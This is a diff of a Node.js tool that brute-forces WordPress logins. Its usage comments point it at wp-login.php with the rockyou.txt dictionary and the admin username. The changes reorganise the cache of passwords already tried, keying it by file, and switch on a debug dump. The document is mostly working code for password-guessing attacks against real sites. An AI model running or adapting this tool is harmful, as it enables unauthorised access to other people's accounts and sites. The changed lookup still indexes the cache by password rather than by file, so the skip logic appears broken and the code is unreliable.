@@ -1,6 +1,6 @@
 #!/usr/bin/env node
 // node ./wplogin -d ./wplogin/~dicts/rockyou.txt -h 'http://www.example.com' -p '/blog/wp-login.php' -v -s30 -t20 -r
-// node .wplogin -h 'http://www.example.com' -u admin -v -s10 -r
+// node ./wplogin -h 'http://www.example.com' -u admin -v -s10 -r
 
 var fs = require('fs')
 ,split = require('split')
@@ -23,7 +23,10 @@ var fs = require('fs')
 ,maxCmdThreads = argv.t ? +argv.t : config.maxCmdThreads
 ,dictFile = path.normalize(argv.d || __dirname+'/dict.example')
 ,dictDir
-,previouslyChecked = {}
+,previouslyChecked = {
+	_: {}
+	,f: {}
+}
 ,checkedThisProcess = {}
 ,statsInterval = null
 ,stats = {
@@ -73,10 +76,12 @@ fs.stat(dictFile,function(err,stat){
 		if (err)
 			return console.log('Error getting saved results',err);
 		data.forEach(function(v){
-			previouslyChecked[v.pass] = true;
+			if (!previouslyChecked._[v.file]) previouslyChecked._[v.file] = {};
+			if (!previouslyChecked.f[v.file]) previouslyChecked.f[v.file] = {};
+			previouslyChecked._[v.file][v.pass] = previouslyChecked.f[v.file][v.pass] = true;
 		});
-		console.log('Num previously checked: '+data.length);
-		//console.log('previouslyChecked:\n',previouslyChecked,'\n\n');
+		//console.log('Num previously checked: '+data.length);
+		console.log('previouslyChecked:\n',previouslyChecked,'\n\n');
 		delete data;
 		through(checkDicts).on('attemptReceived',function(err, pass, data, stdOut, stdErr){
 			if (err) {
@@ -177,7 +182,7 @@ function checkDicts(files,cb){
 		++stats.filesOpened;
 		streams[streams.length-1] = fs.createReadStream(file).pipe(split()).on('data',function(pass){
 			++stats.passesRead;
-			if (previouslyChecked[pass]) {
+			if (previouslyChecked._[pass]) {
 				++stats.skipped;
 				return z.emit('attemptReceived',false,pass);
 			}
